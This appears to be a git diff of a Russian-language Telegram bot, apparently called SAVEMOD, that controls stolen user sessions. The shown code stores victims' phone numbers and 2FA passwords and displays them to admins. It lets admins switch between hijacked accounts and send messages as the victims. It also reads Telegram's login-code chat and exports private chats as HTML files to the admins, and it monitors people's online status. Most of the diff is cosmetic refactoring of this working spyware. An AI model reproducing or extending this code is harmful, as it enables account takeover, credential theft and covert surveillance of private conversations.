@@ -19,10 +19,6 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile,
 from aiogram.utils import executor
 import nest_asyncio
 
-# ============================================================================
-# НАСТРОЙКА
-# ============================================================================
-
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 nest_asyncio.apply()
@@ -33,14 +29,10 @@ BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
 ADMIN_IDS = [int(x.strip()) for x in os.environ.get('ADMIN_IDS', '').split(',') if x.strip()]
 
 if not API_ID or not API_HASH or not BOT_TOKEN:
-    logger.error("❌ Ошибка: Не заданы переменные окружения API_ID, API_HASH, BOT_TOKEN")
+    logger.error("Ошибка: Не заданы переменные окружения")
     sys.exit(1)
 
-logger.info(f"👥 Администраторы: {ADMIN_IDS}")
-
-# ============================================================================
-# БАЗА ДАННЫХ
-# ============================================================================
+logger.info(f"Администраторы: {ADMIN_IDS}")
 
 VOLUME_PATH = os.environ.get('VOLUME_MOUNTS', '/app/data')
 if not os.path.exists(VOLUME_PATH):
@@ -52,7 +44,6 @@ DB_PATH = os.path.join(VOLUME_PATH, 'userbot.db')
 conn = sqlite3.connect(DB_PATH, check_same_thread=False)
 cursor = conn.cursor()
 
-# Создание таблиц
 cursor.execute('''
     CREATE TABLE IF NOT EXISTS user_sessions (
         user_id INTEGER PRIMARY KEY,
@@ -66,11 +57,8 @@ cursor.execute('''
         registered_at TEXT
     )
 ''')
-
-# Добавляем колонку если нет (фикс ошибки registered_at)
 try:
     cursor.execute('ALTER TABLE user_sessions ADD COLUMN registered_at TEXT')
-    conn.commit()
 except:
     pass
 
@@ -117,35 +105,26 @@ cursor.execute('''
 ''')
 
 conn.commit()
-logger.info("✅ База данных готова")
 
-# ============================================================================
-# ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
-# ============================================================================
-
-active_clients: Dict[int, TelegramClient] = {}
-saved_messages: Dict[int, Dict[int, Dict]] = {}
-temp_auth: Dict[int, Dict] = {}
-active_chats: Dict[int, List[Dict]] = {}
-user_status_tracker: Dict[int, Dict[int, str]] = {}
-current_active_user: Optional[int] = None
-monitored_users: Dict[str, Dict] = {}
-pending_2fa: Dict[int, Dict] = {}
+active_clients = {}
+saved_messages = {}
+temp_auth = {}
+active_chats = {}
+user_status_tracker = {}
+current_active_user = None
+monitored_users = {}
+pending_2fa = {}
 
 bot = Bot(token=BOT_TOKEN, parse_mode='HTML')
 dp = Dispatcher(bot)
 
-# ============================================================================
-# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
-# ============================================================================
-
-def is_admin(user_id: int) -> bool:
+def is_admin(user_id):
     return user_id in ADMIN_IDS
 
-def is_target_admin(target_id: int) -> bool:
+def is_target_admin(target_id):
     return target_id in ADMIN_IDS
 
-def escape_html(text: str) -> str:
+def escape_html(text):
     return html.escape(str(text))
 
 def get_status_text(status):
@@ -162,7 +141,7 @@ def get_status_text(status):
     else:
         return "⚪ Статус скрыт"
 
-def get_active_client() -> Tuple[Optional[TelegramClient], Optional[int]]:
+def get_active_client():
     global current_active_user
     if current_active_user and current_active_user in active_clients:
         return active_clients[current_active_user], current_active_user
@@ -172,22 +151,20 @@ def get_active_client() -> Tuple[Optional[TelegramClient], Optional[int]]:
             return client, uid
     return None, None
 
-async def resolve_entity(client, target: str):
+async def resolve_entity(client, target):
     try:
         if target.isdigit():
             return await client.get_entity(int(target))
         if target.startswith('@'):
             return await client.get_entity(target)
-        if target.lower() == 'me':
-            return await client.get_me()
         return await client.get_entity(target)
     except:
         return None
 
-async def send_to_admins(text: str):
+async def send_to_admins(text):
     for admin_id in ADMIN_IDS:
         try:
-            await bot.send_message(admin_id, text, parse_mode='HTML')
+            await bot.send_message(admin_id, text)
         except:
             pass
 
@@ -208,15 +185,15 @@ async def export_chat_to_html(client, chat_id, chat_name, me):
         if msg.text:
             try:
                 if msg.out:
-                    sender_name = f"{me.first_name} (Я)"
-                    sender_class = "outgoing"
+                    sender = f"{me.first_name} (Я)"
+                    css = "outgoing"
                 else:
-                    sender = await client.get_entity(msg.sender_id)
-                    sender_name = sender.first_name or sender.username or str(msg.sender_id)
-                    sender_class = "incoming"
-                timestamp = msg.date.strftime('%d.%m.%Y %H:%M:%S')
-                text = escape_html(msg.text).replace('\n', '<br>')
-                messages.append(f'<div class="message {sender_class}"><div class="msg-header"><span class="sender">{escape_html(sender_name)}</span><span class="date">{timestamp}</span></div><div class="msg-text">{text}</div></div>')
+                    s = await client.get_entity(msg.sender_id)
+                    sender = s.first_name or s.username or str(msg.sender_id)
+                    css = "incoming"
+                dt = msg.date.strftime('%d.%m.%Y %H:%M:%S')
+                txt = escape_html(msg.text).replace('\n', '<br>')
+                messages.append(f'<div class="msg {css}"><div class="hdr"><span class="snd">{escape_html(sender)}</span><span class="dt">{dt}</span></div><div class="txt">{txt}</div></div>')
             except:
                 continue
     if not messages:
@@ -228,48 +205,43 @@ async def export_chat_to_html(client, chat_id, chat_name, me):
 <style>
 body {{ font-family: system-ui; background: #0e1621; color: #e1e8f0; margin: 0; padding: 20px; }}
 .container {{ max-width: 800px; margin: 0 auto; background: #17212b; border-radius: 16px; }}
-.header {{ background: #1e2a3a; padding: 20px; border-bottom: 1px solid #2b3945; }}
-.messages {{ padding: 20px; }}
-.message {{ margin-bottom: 16px; padding: 10px 14px; border-radius: 14px; max-width: 85%; }}
+.hdr {{ background: #1e2a3a; padding: 20px; border-bottom: 1px solid #2b3945; }}
+.msgs {{ padding: 20px; }}
+.msg {{ margin-bottom: 16px; padding: 10px 14px; border-radius: 14px; max-width: 85%; }}
 .incoming {{ background: #2b3945; margin-right: auto; }}
 .outgoing {{ background: #5288c1; margin-left: auto; text-align: right; }}
-.msg-header {{ font-size: 12px; margin-bottom: 6px; display: flex; justify-content: space-between; }}
-.sender {{ font-weight: bold; }}
-.date {{ font-size: 10px; color: #6c7883; }}
-.msg-text {{ font-size: 14px; white-space: pre-wrap; }}
-.footer {{ background: #0e1621; padding: 12px; text-align: center; font-size: 12px; color: #6c7883; }}
+.hdr2 {{ font-size: 12px; margin-bottom: 6px; display: flex; justify-content: space-between; }}
+.snd {{ font-weight: bold; }}
+.dt {{ font-size: 10px; color: #6c7883; }}
+.txt {{ font-size: 14px; white-space: pre-wrap; }}
+.ftr {{ background: #0e1621; padding: 12px; text-align: center; font-size: 12px; color: #6c7883; }}
 </style>
 </head>
 <body>
 <div class="container">
-<div class="header"><h2>💬 Чат с {escape_html(chat_name)}</h2><div>Всего: {len(messages)}</div></div>
-<div class="messages">{''.join(messages)}</div>
-<div class="footer">📅 {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}</div>
+<div class="hdr"><h2>Чат с {escape_html(chat_name)}</h2><div>Сообщений: {len(messages)}</div></div>
+<div class="msgs">{''.join(messages)}</div>
+<div class="ftr">{datetime.now().strftime('%d.%m.%Y %H:%M:%S')}</div>
 </div>
 </body>
 </html>'''
 
-# ============================================================================
-# АДМИН КОМАНДЫ (БОТ)
-# ============================================================================
-
 @dp.message_handler(commands=['spyhelp'])
 async def cmd_spyhelp(message):
     if not is_admin(message.from_user.id):
+        await message.answer("❌ Нет доступа")
         return
     await message.answer("""
-🕵️ <b>SAVEMOD - ВСЕ КОМАНДЫ</b>
+🔰 АДМИН КОМАНДЫ
 
-<b>👥 УПРАВЛЕНИЕ</b>
 /users - список аккаунтов
 /sessions - список сессий
 /swap НОМЕР - переключить аккаунт
 /active - активный аккаунт
 /del_session НОМЕР - удалить сессию
 /show2fa НОМЕР - показать 2FA
-/reset_me - сбросить свою сессию
+/reset_me - сброс сессии
 
-<b>💬 ДЕЙСТВИЯ</b>
 /send ID/@username текст
 /chat ID/@username/tg
 /chats - список диалогов
@@ -277,41 +249,40 @@ async def cmd_spyhelp(message):
 /online - кто в сети
 /export ID - экспорт чата
 
-<b>📊 МОНИТОРИНГ</b>
-/mon @username - начать слежку
+/mon @username - слежка
 /unmon @username - остановить
 /logs N - логи
 /statuslogs N - логи статусов
 /stats - статистика
-/backup - бэкап БД
+/backup - бэкап
 
-<b>🤖 КОМАНДЫ ЮЗЕРБОТА</b>
+🤖 ЮЗЕРБОТ (через точку)
 .help .mute .unmute .list .spam .type .info
-""", parse_mode='HTML')
+""")
 
 @dp.message_handler(commands=['users'])
 async def cmd_users(message):
     if not is_admin(message.from_user.id):
         return
-    cursor.execute('SELECT user_id, first_name, last_name, username, phone, two_fa, is_active FROM user_sessions')
+    cursor.execute('SELECT user_id, first_name, username, phone, two_fa, is_active FROM user_sessions')
     rows = cursor.fetchall()
     if not rows:
-        await message.answer("📭 Нет аккаунтов")
+        await message.answer("Нет аккаунтов")
         return
-    response = "👥 <b>АККАУНТЫ</b>\n\n"
-    idx = 0
-    for uid, fname, lname, uname, phone, two_fa, is_active in rows:
+    out = "👥 АККАУНТЫ\n\n"
+    i = 0
+    for uid, fn, un, ph, tf, act in rows:
         if is_target_admin(uid):
             continue
-        idx += 1
-        name = fname or uname or str(uid)
-        active_mark = " ✅" if (is_active == 1 or uid == current_active_user) else ""
-        response += f"<b>{idx}. {name}</b>{active_mark}\n   🆔 {uid}\n   📱 {phone or '-'}\n   🔐 {'✅' if two_fa else '❌'}\n\n"
-        if len(response) > 3500:
-            await message.answer(response[:4000], parse_mode='HTML')
-            response = ""
-    if response:
-        await message.answer(response[:4000], parse_mode='HTML')
+        i += 1
+        name = fn or un or str(uid)
+        actm = " ✅" if (act == 1 or uid == current_active_user) else ""
+        out += f"{i}. {name}{actm}\n   🆔 {uid}\n   📱 {ph or '-'}\n   🔐 {'✅' if tf else '❌'}\n\n"
+        if len(out) > 3500:
+            await message.answer(out)
+            out = ""
+    if out:
+        await message.answer(out)
 
 @dp.message_handler(commands=['sessions'])
 async def cmd_sessions(message):
@@ -320,16 +291,16 @@ async def cmd_sessions(message):
     cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
     rows = cursor.fetchall()
     if not rows:
-        await message.answer("📭 Нет сессий")
+        await message.answer("Нет сессий")
         return
     lst = []
-    for uid, fname, uname in rows:
+    for uid, fn, un in rows:
         if is_target_admin(uid):
             continue
-        name = fname or uname or str(uid)
-        status = "✅" if uid in active_clients else "❌"
-        lst.append(f"{status} {uid} - {name}")
-    await message.answer("📋 <b>СЕССИИ</b>\n\n" + "\n".join(lst), parse_mode='HTML')
+        name = fn or un or str(uid)
+        st = "✅" if uid in active_clients else "❌"
+        lst.append(f"{st} {uid} - {name}")
+    await message.answer("СЕССИИ\n\n" + "\n".join(lst))
 
 @dp.message_handler(commands=['del_session'])
 async def cmd_del_session(message):
@@ -337,43 +308,43 @@ async def cmd_del_session(message):
         return
     args = message.get_args()
     if not args:
-        await message.answer("❌ /del_session НОМЕР")
+        await message.answer("/del_session НОМЕР")
         return
     try:
         num = int(args) - 1
         cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
         rows = cursor.fetchall()
-        non_admin = [(uid, fname, uname) for uid, fname, uname in rows if not is_target_admin(uid)]
-        if num < 0 or num >= len(non_admin):
-            await message.answer("❌ Неверный номер")
+        na = [(uid, fn, un) for uid, fn, un in rows if not is_target_admin(uid)]
+        if num < 0 or num >= len(na):
+            await message.answer("Неверный номер")
             return
-        target_id, fname, uname = non_admin[num]
-        name = fname or uname or str(target_id)
-        if target_id in active_clients:
+        tid, fn, un = na[num]
+        name = fn or un or str(tid)
+        if tid in active_clients:
             try:
-                await active_clients[target_id].disconnect()
+                await active_clients[tid].disconnect()
             except:
                 pass
-            del active_clients[target_id]
-        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (target_id,))
-        cursor.execute('DELETE FROM muted_users WHERE muted_by=?', (target_id,))
+            del active_clients[tid]
+        cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (tid,))
+        cursor.execute('DELETE FROM muted_users WHERE muted_by=?', (tid,))
         conn.commit()
-        await message.answer(f"✅ Сессия {name} удалена")
+        await message.answer(f"Сессия {name} удалена")
     except:
-        await message.answer("❌ Ошибка")
+        await message.answer("Ошибка")
 
 @dp.message_handler(commands=['reset_me'])
 async def cmd_reset_me(message):
-    user_id = message.from_user.id
-    if user_id in active_clients:
+    uid = message.from_user.id
+    if uid in active_clients:
         try:
-            await active_clients[user_id].disconnect()
+            await active_clients[uid].disconnect()
         except:
             pass
-        del active_clients[user_id]
-    cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (user_id,))
+        del active_clients[uid]
+    cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (uid,))
     conn.commit()
-    await message.answer("✅ Сессия удалена. Отправь /start")
+    await message.answer("Сессия удалена. Отправь /start")
 
 @dp.message_handler(commands=['show2fa'])
 async def cmd_show2fa(message):
@@ -385,29 +356,29 @@ async def cmd_show2fa(message):
             num = int(args) - 1
             cursor.execute('SELECT user_id, first_name, username, two_fa FROM user_sessions')
             rows = cursor.fetchall()
-            non_admin = [(uid, fname, uname, two_fa) for uid, fname, uname, two_fa in rows if not is_target_admin(uid)]
-            if num < 0 or num >= len(non_admin):
-                await message.answer("❌ Неверный номер")
+            na = [(uid, fn, un, tf) for uid, fn, un, tf in rows if not is_target_admin(uid)]
+            if num < 0 or num >= len(na):
+                await message.answer("Неверный номер")
                 return
-            uid, fname, uname, two_fa = non_admin[num]
-            name = fname or uname or str(uid)
-            if two_fa:
-                await message.answer(f"🔐 2FA для {name}:\n<code>{two_fa}</code>", parse_mode='HTML')
+            uid, fn, un, tf = na[num]
+            name = fn or un or str(uid)
+            if tf:
+                await message.answer(f"2FA для {name}:\n<code>{tf}</code>")
             else:
-                await message.answer(f"❌ У {name} нет 2FA")
+                await message.answer(f"У {name} нет 2FA")
         except:
-            await message.answer("❌ Ошибка")
+            await message.answer("Ошибка")
     else:
-        client, uid = get_active_client()
-        if not client or is_target_admin(uid):
-            await message.answer("❌ Нет активного аккаунта")
+        cl, uid = get_active_client()
+        if not cl or is_target_admin(uid):
+            await message.answer("Нет активного аккаунта")
             return
         cursor.execute('SELECT first_name, two_fa FROM user_sessions WHERE user_id=?', (uid,))
         row = cursor.fetchone()
         if row and row[1]:
-            await message.answer(f"🔐 2FA для {row[0]}:\n<code>{row[1]}</code>", parse_mode='HTML')
+            await message.answer(f"2FA для {row[0]}:\n<code>{row[1]}</code>")
         else:
-            await message.answer(f"❌ Нет 2FA")
+            await message.answer("Нет 2FA")
 
 @dp.message_handler(commands=['swap'])
 async def cmd_swap(message):
@@ -416,43 +387,43 @@ async def cmd_swap(message):
         return
     args = message.get_args()
     if not args:
-        await message.answer("❌ /swap НОМЕР")
+        await message.answer("/swap НОМЕР")
         return
     try:
         num = int(args) - 1
         cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
         rows = cursor.fetchall()
-        non_admin = [(uid, fname, uname) for uid, fname, uname in rows if not is_target_admin(uid)]
-        if num < 0 or num >= len(non_admin):
-            await message.answer("❌ Неверный номер")
+        na = [(uid, fn, un) for uid, fn, un in rows if not is_target_admin(uid)]
+        if num < 0 or num >= len(na):
+            await message.answer("Неверный номер")
             return
-        user_id, fname, uname = non_admin[num]
-        name = fname or uname or str(user_id)
-        if user_id not in active_clients:
-            await message.answer(f"❌ Аккаунт {name} не запущен")
+        uid, fn, un = na[num]
+        name = fn or un or str(uid)
+        if uid not in active_clients:
+            await message.answer(f"Аккаунт {name} не запущен")
             return
-        current_active_user = user_id
+        current_active_user = uid
         cursor.execute('UPDATE user_sessions SET is_active=0')
-        cursor.execute('UPDATE user_sessions SET is_active=1 WHERE user_id=?', (user_id,))
+        cursor.execute('UPDATE user_sessions SET is_active=1 WHERE user_id=?', (uid,))
         conn.commit()
-        me = await active_clients[user_id].get_me()
-        await message.answer(f"✅ Переключился на {me.first_name}")
+        me = await active_clients[uid].get_me()
+        await message.answer(f"Переключился на {me.first_name}")
     except:
-        await message.answer("❌ Ошибка")
+        await message.answer("Ошибка")
 
 @dp.message_handler(commands=['active'])
 async def cmd_active(message):
     if not is_admin(message.from_user.id):
         return
-    client, uid = get_active_client()
-    if not client or is_target_admin(uid):
-        await message.answer("❌ Нет активного аккаунта")
+    cl, uid = get_active_client()
+    if not cl or is_target_admin(uid):
+        await message.answer("Нет активного аккаунта")
         return
     try:
-        me = await client.get_me()
-        await message.answer(f"✅ Активный: {me.first_name} (@{me.username or 'нет'})")
+        me = await cl.get_me()
+        await message.answer(f"Активный: {me.first_name} (@{me.username or 'нет'})")
     except:
-        await message.answer(f"✅ Активный ID: {uid}")
+        await message.answer(f"Активный ID: {uid}")
 
 @dp.message_handler(commands=['send'])
 async def cmd_send(message):
@@ -460,156 +431,155 @@ async def cmd_send(message):
         return
     args = message.get_args()
     if not args:
-        await message.answer("❌ /send @username текст")
+        await message.answer("/send @username текст")
         return
     parts = args.split(maxsplit=1)
     if len(parts) < 2:
-        await message.answer("❌ /send @username текст")
+        await message.answer("/send @username текст")
         return
-    client, uid = get_active_client()
-    if not client:
-        await message.answer("❌ Нет активного аккаунта")
+    cl, uid = get_active_client()
+    if not cl:
+        await message.answer("Нет активного аккаунта")
         return
-    entity = await resolve_entity(client, parts[0])
-    if not entity or is_target_admin(entity.id):
-        await message.answer("❌ Пользователь не найден или админ")
+    ent = await resolve_entity(cl, parts[0])
+    if not ent or is_target_admin(ent.id):
+        await message.answer("Не найден")
         return
     try:
-        await client.send_message(entity.id, parts[1])
-        await message.answer(f"✅ Отправлено: {parts[1][:100]}")
+        await cl.send_message(ent.id, parts[1])
+        await message.answer(f"Отправлено: {parts[1][:100]}")
     except Exception as e:
-        await message.answer(f"❌ Ошибка: {e}")
+        await message.answer(f"Ошибка: {e}")
 
-# ===== /chat - РАБОТАЕТ СРАЗУ БЕЗ /chats =====
 @dp.message_handler(commands=['chat'])
 async def cmd_chat(message):
     if not is_admin(message.from_user.id):
         return
     args = message.get_args()
     if not args:
-        await message.answer("❌ /chat ID\n/chat @username\n/chat tg")
+        await message.answer("/chat ID\n/chat @username\n/chat tg")
         return
-    client, uid = get_active_client()
-    if not client:
-        await message.answer("❌ Нет активного аккаунта")
+    cl, uid = get_active_client()
+    if not cl:
+        await message.answer("Нет активного аккаунта")
         return
     try:
         if args.lower() in ['tg', '777000', 'telegram']:
-            chat_id = 777000
-            chat_name = "Telegram (коды)"
+            cid = 777000
+            cname = "Telegram (коды)"
         else:
-            entity = await resolve_entity(client, args)
-            if not entity or is_target_admin(entity.id):
-                await message.answer("❌ Пользователь не найден")
+            ent = await resolve_entity(cl, args)
+            if not ent or is_target_admin(ent.id):
+                await message.answer("Не найден")
                 return
-            chat_id = entity.id
-            chat_name = entity.first_name or entity.username or args
+            cid = ent.id
+            cname = ent.first_name or ent.username or args
         kb = InlineKeyboardMarkup(row_width=2)
         kb.add(
-            InlineKeyboardButton("📝 Последние 30", callback_data=f"chat_last_{chat_id}_{chat_name}"),
-            InlineKeyboardButton("📄 Полный HTML", callback_data=f"chat_full_{chat_id}_{chat_name}")
+            InlineKeyboardButton("Последние 30", callback_data=f"cl_{cid}_{cname}"),
+            InlineKeyboardButton("Полный HTML", callback_data=f"cf_{cid}_{cname}")
         )
-        await message.answer(f"📱 Чат с {chat_name}", reply_markup=kb)
+        await message.answer(f"Чат с {cname}", reply_markup=kb)
     except Exception as e:
-        await message.answer(f"❌ Ошибка: {e}")
+        await message.answer(f"Ошибка: {e}")
 
 @dp.message_handler(commands=['chats'])
 async def cmd_chats(message):
     if not is_admin(message.from_user.id):
         return
-    client, uid = get_active_client()
-    if not client:
-        await message.answer("❌ Нет активного аккаунта")
+    cl, uid = get_active_client()
+    if not cl:
+        await message.answer("Нет активного аккаунта")
         return
-    await message.answer("🔄 Собираю список...")
+    await message.answer("Собираю список...")
     chats = []
-    async for dialog in client.iter_dialogs():
-        if dialog.is_user:
+    async for dlg in cl.iter_dialogs():
+        if dlg.is_user:
             try:
-                entity = await client.get_entity(dialog.id)
-                if getattr(entity, 'bot', False) or entity.id == uid or is_target_admin(entity.id):
+                ent = await cl.get_entity(dlg.id)
+                if getattr(ent, 'bot', False) or ent.id == uid or is_target_admin(ent.id):
                     continue
-                name = entity.first_name or entity.username or str(entity.id)
-                chats.append({'id': entity.id, 'name': name})
+                name = ent.first_name or ent.username or str(ent.id)
+                chats.append({'id': ent.id, 'name': name})
             except:
-                chats.append({'id': dialog.id, 'name': dialog.name or str(dialog.id)})
+                chats.append({'id': dlg.id, 'name': dlg.name or str(dlg.id)})
     active_chats[uid] = chats
     if not chats:
-        await message.answer("📭 Нет диалогов")
+        await message.answer("Нет диалогов")
         return
-    response = "📋 ДИАЛОГИ\n\n"
-    for i, chat in enumerate(chats):
-        response += f"{i+1}. {chat['name']}\n"
-        if len(response) > 3500:
-            await message.answer(response)
-            response = ""
-    if response:
-        await message.answer(response)
+    out = "ДИАЛОГИ\n\n"
+    for i, ch in enumerate(chats):
+        out += f"{i+1}. {ch['name']}\n"
+        if len(out) > 3500:
+            await message.answer(out)
+            out = ""
+    if out:
+        await message.answer(out)
 
-@dp.callback_query_handler(lambda c: c.data.startswith('chat_last_'))
-async def chat_last_callback(callback):
-    if not is_admin(callback.from_user.id):
-        await callback.answer("❌ Нет прав")
+@dp.callback_query_handler(lambda c: c.data.startswith('cl_'))
+async def chat_last(cb):
+    if not is_admin(cb.from_user.id):
+        await cb.answer("Нет прав")
         return
-    data = callback.data.replace('chat_last_', '').split('_', 1)
-    chat_id = int(data[0])
-    chat_name = data[1]
-    client, uid = get_active_client()
-    if not client:
-        await callback.message.answer("❌ Нет активного аккаунта")
+    data = cb.data.replace('cl_', '').split('_', 1)
+    cid = int(data[0])
+    cname = data[1]
+    cl, uid = get_active_client()
+    if not cl:
+        await cb.message.answer("Нет активного аккаунта")
         return
     msgs = []
-    async for msg in client.iter_messages(chat_id, limit=30):
+    async for msg in cl.iter_messages(cid, limit=30):
         if msg.text:
             try:
                 if msg.out:
-                    sender = "👉 Я"
+                    sn = "👉 Я"
                 else:
-                    s = await client.get_entity(msg.sender_id)
+                    s = await cl.get_entity(msg.sender_id)
                     if is_target_admin(s.id):
                         continue
-                    sender = s.first_name or s.username or str(s.id)
-                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {sender}: {msg.text[:150]}")
+                    sn = s.first_name or s.username or str(s.id)
+                msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {sn}: {msg.text[:150]}")
             except:
                 msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {msg.text[:150]}")
     if msgs:
-        await callback.message.answer(f"💬 ЧАТ С {chat_name}\n\n" + "\n".join(reversed(msgs[-25:])))
+        await cb.message.answer(f"Чат с {cname}\n\n" + "\n".join(reversed(msgs[-25:])))
     else:
-        await callback.message.answer("📭 Нет сообщений")
+        await cb.message.answer("Нет сообщений")
 
-@dp.callback_query_handler(lambda c: c.data.startswith('chat_full_'))
-async def chat_full_callback(callback):
-    if not is_admin(callback.from_user.id):
-        await callback.answer("❌ Нет прав")
+@dp.callback_query_handler(lambda c: c.data.startswith('cf_'))
+async def chat_full(cb):
+    if not is_admin(cb.from_user.id):
+        await cb.answer("Нет прав")
         return
-    data = callback.data.replace('chat_full_', '').split('_', 1)
-    chat_id = int(data[0])
-    chat_name = data[1]
-    client, uid = get_active_client()
-    if not client:
-        await callback.message.answer("❌ Нет активного аккаунта")
+    data = cb.data.replace('cf_', '').split('_', 1)
+    cid = int(data[0])
+    cname = data[1]
+    cl, uid = get_active_client()
+    if not cl:
+        await cb.message.answer("Нет активного аккаунта")
         return
     try:
-        me = await client.get_me()
-        status_msg = await callback.message.answer("🔄 Экспортирую...")
-        html_content = await export_chat_to_html(client, chat_id, chat_name, me)
-        if not html_content:
-            await status_msg.edit_text("❌ Нет сообщений")
+        me = await cl.get_me()
+        status = await cb.message.answer("Экспортирую...")
+        htmlc = await export_chat_to_html(cl, cid, cname, me)
+        if not htmlc:
+            await status.edit_text("Нет сообщений")
             return
         with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
-            f.write(html_content)
-            temp_path = f.name
-        with open(temp_path, 'rb') as f:
-            for admin_id in ADMIN_IDS:
+            f.write(htmlc)
+            path = f.name
+        with open(path, 'rb') as f:
+            for aid in ADMIN_IDS:
                 try:
-                    await bot.send_document(admin_id, InputFile(f, filename=f"chat_{chat_name}.html"), caption=f"📁 Чат с {chat_name}")
+                    await bot.send_document(aid, InputFile(f, filename=f"chat_{cname}.html"), caption=f"Чат с {cname}")
                     await f.seek(0)
                 except:
                     pass
-        os.unlink(temp_path)
-        await status_msg.delete()
+        os.unlink(path)
+        await status.delete()
     except Exception as e:
-        await callback.message.answer(f"❌ Ошибка: {e}")
+        await cb.message.answer(f"Ошибка: {e}")
 
 @dp.message_handler(commands=['export'])
 async def cmd_export(message):
@@ -617,38 +587,38 @@ async def cmd_export(message):
         return
     args = message.get_args()
     if not args:
-        await message.answer("❌ /export ID")
+        await message.answer("/export ID или @username")
         return
-    client, uid = get_active_client()
-    if not client:
-        await message.answer("❌ Нет активного аккаунта")
+    cl, uid = get_active_client()
+    if not cl:
+        await message.answer("Нет активного аккаунта")
         return
-    entity = await resolve_entity(client, args)
-    if not entity or is_target_admin(entity.id):
-        await message.answer("❌ Пользователь не найден")
+    ent = await resolve_entity(cl, args)
+    if not ent or is_target_admin(ent.id):
+        await message.answer("Не найден")
         return
-    chat_name = entity.first_name or entity.username or str(entity.id)
-    status_msg = await message.answer(f"🔄 Экспортирую чат с {chat_name}...")
+    name = ent.first_name or ent.username or str(ent.id)
+    status = await message.answer(f"Экспортирую чат с {name}...")
     try:
-        me = await client.get_me()
-        html_content = await export_chat_to_html(client, entity.id, chat_name, me)
-        if not html_content:
-            await status_msg.edit_text("❌ Нет сообщений")
+        me = await cl.get_me()
+        htmlc = await export_chat_to_html(cl, ent.id, name, me)
+        if not htmlc:
+            await status.edit_text("Нет сообщений")
             return
         with tempfile.NamedTemporaryFile(mode='w', suffix='.html', encoding='utf-8', delete=False) as f:
-            f.write(html_content)
-            temp_path = f.name
-        with open(temp_path, 'rb') as f:
-            for admin_id in ADMIN_IDS:
+            f.write(htmlc)
+            path = f.name
+        with open(path, 'rb') as f:
+            for aid in ADMIN_IDS:
                 try:
-                    await bot.send_document(admin_id, InputFile(f, filename=f"chat_{chat_name}.html"), caption=f"📁 Чат с {chat_name}")
+                    await bot.send_document(aid, InputFile(f, filename=f"chat_{name}.html"), caption=f"Чат с {name}")
                     await f.seek(0)
                 except:
                     pass
-        os.unlink(temp_path)
-        await status_msg.delete()
+        os.unlink(path)
+        await status.delete()
     except Exception as e:
-        await status_msg.edit_text(f"❌ Ошибка: {e}")
+        await status.edit_text(f"Ошибка: {e}")
 
 @dp.message_handler(commands=['status'])
 async def cmd_status(message):
@@ -656,40 +626,40 @@ async def cmd_status(message):
         return
     args = message.get_args()
     if not args:
-        await message.answer("❌ /status @username")
+        await message.answer("/status @username")
         return
-    client, uid = get_active_client()
-    if not client:
-        await message.answer("❌ Нет активного аккаунта")
+    cl, uid = get_active_client()
+    if not cl:
+        await message.answer("Нет активного аккаунта")
         return
-    entity = await resolve_entity(client, args)
-    if not entity or getattr(entity, 'bot', False) or is_target_admin(entity.id):
-        await message.answer("❌ Не найден или админ")
+    ent = await resolve_entity(cl, args)
+    if not ent or getattr(ent, 'bot', False) or is_target_admin(ent.id):
+        await message.answer("Не найден")
         return
-    status_text = get_status_text(entity.status) if hasattr(entity, 'status') else "Статус скрыт"
-    await message.answer(f"👤 {entity.first_name}\n🆔 {entity.id}\n📊 {status_text}")
+    st = get_status_text(ent.status) if hasattr(ent, 'status') else "Статус скрыт"
+    await message.answer(f"{ent.first_name}\nID: {ent.id}\n{st}")
 
 @dp.message_handler(commands=['online'])
 async def cmd_online(message):
     if not is_admin(message.from_user.id):
         return
-    client, uid = get_active_client()
-    if not client:
-        await message.answer("❌ Нет активного аккаунта")
+    cl, uid = get_active_client()
+    if not cl:
+        await message.answer("Нет активного аккаунта")
         return
     online = []
-    async for dialog in client.iter_dialogs():
-        if dialog.is_user:
+    async for dlg in cl.iter_dialogs():
+        if dlg.is_user:
             try:
-                entity = await client.get_entity(dialog.id)
-                if not getattr(entity, 'bot', False) and not is_target_admin(entity.id) and isinstance(entity.status, UserStatusOnline):
-                    online.append(dialog.name)
+                ent = await cl.get_entity(dlg.id)
+                if not getattr(ent, 'bot', False) and not is_target_admin(ent.id) and isinstance(ent.status, UserStatusOnline):
+                    online.append(dlg.name)
             except:
                 pass
     if online:
-        await message.answer(f"🟢 В сети ({len(online)}):\n" + "\n".join(online[:30]))
+        await message.answer(f"В сети ({len(online)}):\n" + "\n".join(online[:30]))
     else:
-        await message.answer("🟢 Никого")
+        await message.answer("Никого в сети")
 
 @dp.message_handler(commands=['mon'])
 async def cmd_mon(message):
@@ -697,18 +667,18 @@ async def cmd_mon(message):
         return
     args = message.get_args()
     if not args:
-        await message.answer("❌ /mon @username")
+        await message.answer("/mon @username")
         return
-    client, uid = get_active_client()
-    if not client:
-        await message.answer("❌ Нет активного аккаунта")
+    cl, uid = get_active_client()
+    if not cl:
+        await message.answer("Нет активного аккаунта")
         return
-    entity = await resolve_entity(client, args)
-    if not entity or getattr(entity, 'bot', False) or is_target_admin(entity.id):
-        await message.answer("❌ Не найден или админ")
+    ent = await resolve_entity(cl, args)
+    if not ent or getattr(ent, 'bot', False) or is_target_admin(ent.id):
+        await message.answer("Не найден")
         return
-    monitored_users[str(entity.id)] = {'name': entity.first_name, 'admin_id': message.from_user.id}
-    await message.answer(f"✅ Мониторинг {entity.first_name} начат")
+    monitored_users[str(ent.id)] = {'name': ent.first_name, 'admin_id': message.from_user.id}
+    await message.answer(f"Мониторинг {ent.first_name} начат")
 
 @dp.message_handler(commands=['unmon'])
